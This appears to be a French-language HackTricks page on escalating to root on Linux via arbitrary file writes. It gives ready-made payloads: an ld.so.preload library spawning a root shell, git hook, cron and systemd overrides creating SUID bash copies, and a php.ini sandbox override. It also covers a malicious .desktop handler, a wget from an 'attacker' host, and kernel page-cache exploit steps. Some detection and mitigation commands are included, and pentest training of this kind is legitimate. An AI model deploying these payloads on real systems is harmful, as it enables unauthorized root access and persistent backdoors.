# Écriture arbitraire de fichiers en tant que root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ce fichier se comporte comme la variable d'environnement **`LD_PRELOAD`**, mais il fonctionne également avec les **binaires SUID**.\
Si vous pouvez le créer ou le modifier, vous pouvez simplement y ajouter un **chemin vers une bibliothèque qui sera chargée** avec chaque binaire exécuté.

Par exemple : `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) sont des **scripts** qui sont **exécutés** lors de différents **événements** dans un dépôt git, comme lorsqu’un commit est créé, lors d’un merge... Ainsi, si un **script ou utilisateur privilégié** effectue fréquemment ces actions et qu’il est possible **d’écrire dans le dossier `.git`**, cela peut être utilisé pour faire de la **privesc**.

Par exemple, il est possible de **générer un script** dans un dépôt git, dans **`.git/hooks`**, afin qu’il soit toujours exécuté lorsqu’un nouveau commit est créé :
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Fichiers Cron et fichiers liés au temps

Si vous pouvez **écrire dans des fichiers liés à Cron que root exécute**, vous pouvez généralement obtenir une exécution de code lors de la prochaine exécution de la tâche. Les cibles intéressantes incluent :

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- La crontab de root dans `/var/spool/cron/` ou `/var/spool/cron/crontabs/`
- Les timers `systemd` et les services qu’ils déclenchent

Vérifications rapides :
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Chemins d’abus typiques :

- **Ajouter une nouvelle tâche cron root** à `/etc/crontab` ou dans un fichier de `/etc/cron.d/`
- **Remplacer un script** déjà exécuté par `run-parts`
- **Backdoorer une cible de timer existante** en modifiant le script ou le binaire qu’elle lance

Exemple minimal de payload cron :
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Si vous pouvez seulement écrire dans un répertoire cron utilisé par `run-parts`, déposez-y plutôt un fichier exécutable :
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notes :

- `run-parts` ignore généralement les noms de fichiers contenant des points ; préférez donc des noms comme `backup` plutôt que `backup.sh`.
- Certaines distributions utilisent `anacron` ou des timers `systemd` à la place du cron classique, mais l'idée d'exploitation reste la même : **modifier ce que root exécutera ultérieurement**.

### Fichiers de service et de socket

Si vous pouvez écrire dans des **fichiers d'unité `systemd`** ou dans les fichiers référencés par ceux-ci, vous pourrez peut-être obtenir une exécution de code en tant que root en rechargeant et en redémarrant l'unité, ou en attendant que le chemin d'activation du service/socket se déclenche.

Les cibles intéressantes incluent :

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Substitutions drop-in dans `/etc/systemd/system/<unit>.d/*.conf`
- Scripts/binaires de service référencés par `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Chemins `EnvironmentFile=` accessibles en écriture et chargés par un service root

Vérifications rapides :
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Voies d’abus courantes :

- **Overwrite `ExecStart=`** dans une unité de service appartenant à root que vous pouvez modifier
- **Add a drop-in override** avec un `ExecStart=` malveillant et effacer l’ancien au préalable
- **Backdoor** le script/binaire déjà référencé par l’unité
- **Hijack a socket-activated service** en modifiant le fichier `.service` correspondant, qui démarre lorsque le socket reçoit une connexion

Exemple d’override malveillant :
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Flux d’activation typique :
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Si vous ne pouvez pas redémarrer vous-même les services, mais que vous pouvez modifier une unité activée par socket, vous devrez peut-être seulement **attendre une connexion client** pour déclencher l’exécution du service contenant une backdoor avec les privilèges root.

### Remplacer un `php.ini` restrictif utilisé par un sandbox PHP privilégié

Certains daemons personnalisés valident le code PHP fourni par l’utilisateur en exécutant `php` avec un **`php.ini` restrictif** (par exemple, `disable_functions=exec,system,...`). Si le code exécuté dans le sandbox dispose toujours d’une **primitive d’écriture** (comme `file_put_contents`) et que vous pouvez atteindre le **chemin exact du fichier `php.ini`** utilisé par le daemon, vous pouvez **remplacer cette configuration** afin de lever les restrictions, puis soumettre un second payload qui s’exécute avec des privilèges élevés.<sup>[[2]](#references)</sup>

Flux typique :

1. Le premier payload remplace la configuration du sandbox.
2. Le second payload exécute désormais le code, puisque les fonctions dangereuses sont réactivées.

Exemple minimal (remplacez le chemin utilisé par le daemon) :
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Si le daemon s'exécute en tant que root (ou effectue des validations avec des chemins appartenant à root), la deuxième exécution fournit un contexte root. Il s'agit essentiellement d'une **élévation de privilèges via l'écrasement de la configuration** lorsque le runtime sandboxé peut toujours écrire des fichiers.

### binfmt_misc

Le fichier situé dans `/proc/sys/fs/binfmt_misc` indique quel binaire doit exécuter quel type de fichiers. TODO : vérifier les conditions nécessaires pour exploiter cela afin d'exécuter une rev shell lorsqu'un type de fichier courant est ouvert.

### Écraser les gestionnaires de schémas (comme http: ou https:)

Un attaquant disposant des permissions d'écriture sur les répertoires de configuration d'une victime peut facilement remplacer ou créer des fichiers qui modifient le comportement du système, entraînant une exécution de code involontaire. En modifiant le fichier `$HOME/.config/mimeapps.list` pour faire pointer les gestionnaires d'URL HTTP et HTTPS vers un fichier malveillant (par exemple, en définissant `x-scheme-handler/http=evil.desktop`), l'attaquant s'assure que **cliquer sur n'importe quel lien http ou https déclenche le code spécifié dans ce fichier `evil.desktop`**. Par exemple, après avoir placé le code malveillant suivant dans `evil.desktop` sous `$HOME/.local/share/applications`, tout clic sur une URL externe exécute la commande intégrée :
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Pour plus d’informations, consultez [**cet article**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), qui a été utilisé pour exploiter une vulnérabilité réelle.

### Root exécutant des scripts/binaires accessibles en écriture par l’utilisateur

Si un workflow privilégié exécute quelque chose comme `/bin/sh /home/username/.../script` (ou n’importe quel binaire situé dans un répertoire appartenant à un utilisateur non privilégié), vous pouvez le détourner :<sup>[[1]](#references)</sup>

- **Détecter l’exécution :** surveillez les processus avec [pspy](https://github.com/DominicBreuker/pspy) pour repérer Root invoquant des chemins contrôlés par l’utilisateur :
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirmer la possibilité d’écriture :** vérifier que le fichier cible et son répertoire sont tous deux possédés par votre utilisateur ou accessibles en écriture par celui-ci.
- **Détourner la cible :** sauvegarder le binaire/script d’origine et déposer un payload qui crée un shell SUID (ou toute autre action root), puis restaurer les permissions :
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Déclencher l'action privilégiée** (par exemple, appuyer sur un bouton d'interface qui lance le helper). Lorsque root réexécute le chemin détourné, récupérer le shell avec élévation de privilèges avec `./rootshell -p`.

### Modification des fichiers binaires privilégiés limitée au page cache

Certains bugs du kernel ne modifient pas le fichier **sur le disque**. Ils permettent plutôt de modifier uniquement la copie du fichier présente dans le **page cache** lorsqu'il est lisible. Si vous pouvez cibler un binaire **setuid** ou exécuté par **root**, l'exécution suivante peut lancer des octets contrôlés par l'attaquant depuis la mémoire et permettre une élévation de privilèges, même si le hash du fichier sur le disque reste inchangé.

Il est utile de considérer cela comme une **primitive d'écriture de fichier limitée au runtime** :

- **Le disque reste propre** : l'inode et les octets sur le disque ne changent pas
- **La mémoire est modifiée** : les processus qui lisent ou exécutent la page en cache obtiennent le contenu modifié par l'attaquant
- **L'effet est temporaire** : la modification disparaît après un redémarrage ou une éviction du cache

Cette primitive se situe entre l'**arbitrary file write** classique et les anciens bugs d'abus du **page cache** tels que Dirty COW / Dirty Pipe :

- Dirty COW reposait sur une race condition
- Dirty Pipe avait des contraintes sur la position d'écriture
- Une primitive limitée au page cache peut être plus fiable si le chemin vulnérable permet des écritures directes dans des pages de fichiers mises en cache

#### Flux générique de privesc

1. Obtenir une primitive kernel capable d'écrire dans des pages du page cache adossées à un fichier
2. L'utiliser contre un **binaire privilégié lisible** ou un autre fichier exécuté par root
3. Déclencher l'exécution **avant** l'éviction de la page du cache
4. Obtenir l'exécution de code en tant que root alors que le fichier sur le disque semble toujours inchangé

Cibles typiques à forte valeur :

- Binaires **setuid-root**
- Helpers lancés par des **services root**
- Binaires couramment exécutés depuis des **containers partageant le kernel/page cache de l'hôte**

#### Exemple de chemin AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) est un bon exemple de cette classe. Le chemin vulnérable se trouvait dans l'API userspace de cryptographie Linux (`AF_ALG` / `algif_aead`) :<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` peut déplacer des références vers des pages du page cache depuis un fichier lisible vers la scatterlist TX de la cryptographie
- le chemin de déchiffrement in-place de `algif_aead` réutilisait les buffers source et destination
- `authencesn` écrivait ensuite dans la région du tag de destination
- lorsque cette région référençait encore des pages adossées au fichier et issues d'un `splice()`, l'écriture se retrouvait dans le **page cache du fichier ciblé**

La technique intéressante n'est donc pas le CVE lui-même, mais le pattern :

- **injecter des pages de cache adossées à un fichier dans un sous-système du kernel**
- faire en sorte que le sous-système les **traite comme une sortie accessible en écriture**
- déclencher un écrasement contrôlé de petite taille en mémoire

Le PoC public utilisait des **écritures répétées de 4 octets** pour patcher `/usr/bin/su` en mémoire, puis l'exécutait.

#### Exemple de chemin ESP / XFRM + clone netfilter TEE

DirtyClone (CVE-2026-43503) présente une autre variante du même pattern **page-cache-only write-to-root**, mais cette fois le sink est le **déchiffrement IPsec ESP** au lieu de `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

La technique importante est l'étape de **metadata-laundering** :

- `splice()` place une **page du page cache en lecture seule, adossée à un fichier**, dans un paquet ESP-in-UDP
- l'atténuation DirtyFrag d'origine marquait ce skb avec `SKBFL_SHARED_FRAG` afin que `esp_input()` effectue une **copie avant le déchiffrement**
- netfilter `TEE` duplique le paquet via `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- le clone conserve la **même référence vers la page physique du page cache**, mais perd `SKBFL_SHARED_FRAG`
- `esp_input()` considère alors le clone comme sûr et exécute le déchiffrement **in-place de `cbc(aes)`** sur la page adossée au fichier

La leçon pour la revue est plus large que le CVE : si une mitigation dépend des **métadonnées du skb/de la page** pour décider si une opération doit d'abord effectuer une copie, tout **chemin de clone/copie qui conserve la page sous-jacente mais supprime les métadonnées** peut réactiver silencieusement la primitive d'écriture.

Flux d'exploitation typique :

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` pour obtenir **`CAP_NET_ADMIN` dans un network namespace privé**
2. activer la loopback et installer une **règle netfilter `TEE`** dans `mangle/OUTPUT`
3. installer des **SAs de transport XFRM ESP** via `NETLINK_XFRM`
4. encoder chaque mot de 4 octets ciblé dans le champ `seq_hi` de la SA (technique de sélection de mots de DirtyFrag)
5. envoyer le paquet ESP-in-UDP issu du `splice()` afin que le **clone TEE** atteigne `esp_input()` et effectue le déchiffrement **in-place**
6. répéter jusqu'à ce que la copie du page cache de `/usr/bin/su` ou d'un autre exécutable privilégié contienne du code contrôlé par l'attaquant

En pratique, l'impact est le même que dans l'exemple `AF_ALG` : le fichier sur le disque reste propre, mais `execve()` consomme les **octets modifiés du page cache** et fournit un shell root.

Vérifications d'exposition utiles pour cette variante :
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
La réduction à court terme de la surface d’attaque est également spécifique au chemin ici : la mise à niveau vers un kernel contenant `48f6a5356a33` corrige le chemin `clone`, tandis que le blocage de l’autoload de `xt_TEE` supprime l’**étape de blanchiment des flags** et que le blocage de `esp4` / `esp6` supprime le **sink de déchiffrement**.

#### Exposition et recherche

Si vous suspectez cette classe de bug, ne vous fiez pas uniquement aux contrôles d’intégrité du disque. Vérifiez également :
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m` : `algif_aead` peut être chargé ou déchargé comme module
- `CONFIG_CRYPTO_USER_API_AEAD=y` : l’interface est intégrée au kernel
- les binaires setuid sont de bonnes cibles, car un patch limité au page cache peut suffire à transformer un foothold local en root

#### Réduction de la surface d’attaque pour le chemin `algif_aead`

Si l’interface vulnérable est fournie par un module chargeable :
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Si cette fonctionnalité est compilée dans le kernel, certains rapports signalent que le chemin init est bloqué avec :
```bash
initcall_blacklist=algif_aead_init
```
Ce type de mitigation mérite également d’être retenu pour d’autres LPE du kernel : si l’exploitation dépend d’une interface optionnelle spécifique, la désactivation ou la mise sur liste noire de cette interface peut interrompre le chemin d’exploitation, même avant qu’une mise à niveau complète du kernel soit disponible.

## Références

- [1] [HTB Bamboo – détournement d’un script exécuté par root dans un répertoire PaperCut accessible en écriture par un utilisateur](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB : Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable : FAQ sur Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Divulgation Openwall oss-security pour CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Correctif Linux stable : crypto: algif_aead - retour au fonctionnement out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory CVE-2026-31431](https://copy.fail/)
- [7] [Theori / Xint : analyse technique](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Dépôt / README de DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog : analyse et exploitation de la variante LPE Linux DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Correctif Linux : net: skb: préservation de `SKBFL_SHARED_FRAG` dans `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Mitigation Linux antérieure : définir `SKBFL_SHARED_FRAG` pour les paquets UDP spliceés (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
